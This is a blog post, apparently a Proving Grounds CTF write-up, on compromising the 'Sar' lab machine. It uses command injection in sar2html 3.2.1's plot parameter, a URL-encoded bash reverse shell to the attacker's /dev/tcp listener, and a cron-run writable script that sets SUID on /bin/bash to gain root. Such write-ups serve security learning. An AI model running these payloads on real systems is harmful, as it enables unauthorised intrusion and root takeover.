<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sar - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary Of ResultThe machine is compromised by exploiting the vulnerable version of sar2html. Once we’ve obtained the initial access, we can then escalate ou...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/sar-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Sar - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/sar-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Sar - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> August 19, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i> Tags:  | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//pg">pg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 5 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary Of Result</strong></h1><p>The machine is compromised by exploiting the vulnerable version of <code class="language-plaintext highlighter-rouge">sar2html</code>. Once we’ve obtained the initial access, we can then escalate our privilege via a <code class="language-plaintext highlighter-rouge">root</code> ‘s crontab that executes a custom <code class="language-plaintext highlighter-rouge">.sh</code> of our control.</p><hr><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We will start our scan with <code class="language-plaintext highlighter-rouge">nmap</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHy/WJJHLFdbwbJpTyRYhEyj2jZV024UPWIdXfNHxq45uh08jkihv3znZ98caLP/pz352c0ZYD31We0bTSbHyjQce2bSAJHubDYp13hU/P4tbV5GIJ72W2rWkLTslH/SJoHUSqlManB7ZzgVyU2KQ4fnNx/V1XGJYsshquRqTrXKeeal+yQvTC4gnsr8ENIGMq0yJnYxMAasx6kmSc+S+065Mie65xkyisFXo2MQyxzsFdCu2w1bYmb3pegYDm6Y0c/EJP0sxDizXVwkUOS0XSVdGuk3RUYjt5GQ2fL24ZsML6CwN+HD2ZTnD0FK90PQTLuvlp6BoI/ZWvIenNvu63
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgxutbLnN4K2tj6ZHzrlzTKS+RRuly+RkA0J63JsQFiwyvz4PqA64w/h0Se3gymZV6zJ9XBpS41b6IoEymeiSA<span class="o">=</span>
|   256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+5254x35Vwa2S7X73YLY87Q58qQOD9oQeSKMpmmT0o
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
</code></pre></div></div><p>There are only two services running on the target: <strong>SSH</strong> and <strong>HTTP</strong>.</p><h4 id="ffuf"><strong>Ffuf</strong></h4><p><code class="language-plaintext highlighter-rouge">ffuf</code> is used to discover hidden directories of a web application. We can start <code class="language-plaintext highlighter-rouge">ffuf</code> by giving it a <code class="language-plaintext highlighter-rouge">-u</code> flag for URL and a <code class="language-plaintext highlighter-rouge">-w</code> flag for wordlist. The comprehensive command will look like:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://192.168.123.35/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt
...
index.html              <span class="o">[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376]
phpinfo.php             <span class="o">[</span>Status: 200, Size: 95515, Words: 4725, Lines: 1170]
robots.txt              <span class="o">[</span>Status: 200, Size: 9, Words: 1, Lines: 2]
server-status           <span class="o">[</span>Status: 403, Size: 279, Words: 20, Lines: 10]
</code></pre></div></div><p>Lets us navigate to the <code class="language-plaintext highlighter-rouge">/robots.txt</code> directory we’ve obtained previously.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> 192.168.123.35/robots.txt | html2text
sar2HTML
</code></pre></div></div><p><code class="language-plaintext highlighter-rouge">robots.txt</code> yields <code class="language-plaintext highlighter-rouge">sar2HTML</code>.</p><p>Opening <code class="language-plaintext highlighter-rouge">sar2HTML</code>, we are redirected to a new directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> 192.168.123.35/sar2HTML/index.php | html2text


                              sar2html Ver 3.2.1
                             <span class="o">(</span>Donate <span class="k">if </span>you like!<span class="o">)</span>

    <span class="k">*</span> New
    <span class="k">*</span> OS
          o HP-UX
          o Linux
          o SunOS
</code></pre></div></div><p>→ The target system is running <code class="language-plaintext highlighter-rouge">sar2html</code> version <code class="language-plaintext highlighter-rouge">3.2.1</code>.</p><p>After conducting a few investigations, we discover that <code class="language-plaintext highlighter-rouge">3.2.1</code> is a vulnerable version of <code class="language-plaintext highlighter-rouge">sar2html</code>, which could lead to Remote Code Execution (RCE).</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit sar2html                
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                              |  Path
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
sar2html 3.2.1 - <span class="s1">'plot'</span> Remote Code Execution                                                                                                               | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                   | php/webapps/47204.txt
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="sar2html-plot-vulnerability">Sar2HTML <code class="language-plaintext highlighter-rouge">plot</code> Vulnerability</h4><p>By exploiting the vulnerable <code class="language-plaintext highlighter-rouge">plot</code> param, we easily achieve code execution.</p><p>There are two ways of achieving code execution.</p><p>[1.] Manual with the following payload:</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.123.35/sar2HTML/index.php?plot=<span class="nt">&lt;OS&gt;</span>;<span class="nt">&lt;command-here&gt;</span>
</code></pre></div></div><p>and <code class="language-plaintext highlighter-rouge">curl</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> 192.168.123.35/sar2HTML/index.php?plot<span class="o">=</span>LINUX%3Bwhoami | html2text

<span class="o">[</span>...]

..&gt;There is no defined host...
www-data
</code></pre></div></div><p>[2.] Using the public <a href="https://www.exploit-db.com/exploits/49344">exploit script.</a></p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 49344.py                                               
Enter The url <span class="o">=&gt;</span> http://192.168.123.35/sar2HTML/       
Command <span class="o">=&gt;</span> <span class="nb">whoami
</span>www-data

Command <span class="o">=&gt;</span> <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><p>It’s always a good idea to URL-encode the reverse shell before sending it. Our final payload is:</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.123%2F80+0%3E%261%22
</code></pre></div></div><p>If everything works properly, our <code class="language-plaintext highlighter-rouge">nc</code> should catch the reverse shell at port 80 as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 80                                                                                                                                                                           1 ⨯
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>192.168.49.123] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.123.35] 43594
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>981<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="crontab"><strong>Crontab</strong></h4><p>There is a cronjob running on the target system by <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
<span class="nb">cat</span> /etc/crontab

...
<span class="c">#</span>
<span class="k">*</span>/5  <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> /var/www/html/ <span class="o">&amp;&amp;</span> <span class="nb">sudo</span> ./finally.sh
</code></pre></div></div><p>→ Every 5 minutes, <code class="language-plaintext highlighter-rouge">root</code> will navigate to the directory <code class="language-plaintext highlighter-rouge">/var/www/html</code> and execute <code class="language-plaintext highlighter-rouge">./finally.sh</code>.</p><p>Let’s us inspect the file <code class="language-plaintext highlighter-rouge">./finally.sh</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">cat</span> /var/www/html/./finally.sh
<span class="nb">cat</span> /var/www/html/./finally.sh

<span class="c">#!/bin/sh</span>

./write.sh
</code></pre></div></div><p>The file <code class="language-plaintext highlighter-rouge">./finally.sh</code> will then execute <code class="language-plaintext highlighter-rouge">./write.sh</code>, which is under our control.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /var/www/html/write.sh    
<span class="nb">ls</span> <span class="nt">-al</span> /var/www/html/write.sh
<span class="nt">-rwxrwxrwx</span> 1 www-data www-data 30 Jul 24  2020 /var/www/html/write.sh
</code></pre></div></div><p>Essentially, we can just craft a payload and write it into the <code class="language-plaintext highlighter-rouge">/var/www/html/write.sh</code>, then wait for 5 minutes, our payload should be executed by <code class="language-plaintext highlighter-rouge">root</code>.</p><p>The payload might look like follow:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">cat</span> /var/www/html/write.sh
<span class="nb">chmod</span> +s /bin/bash
</code></pre></div></div><p>After 5 minutes, <code class="language-plaintext highlighter-rouge">/bin/bash</code> should be dressed with a SUID bit.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/bash
<span class="nb">ls</span> <span class="nt">-al</span> /bin/bash
<span class="nt">-rwsr-sr-x</span> 1 root root 1113504 Jun  7  2019 /bin/bash
</code></pre></div></div><p>This also means we are <code class="language-plaintext highlighter-rouge">root</code> on the system!.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@sar:/var/www/html/sar2HTML<span class="nv">$ </span>bash <span class="nt">-p</span>
bash <span class="nt">-p</span>

<span class="nb">whoami
</span>root
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with <a href="https://jekyllrb.com" target="_blank">Jekyll</a> using <a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a> Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>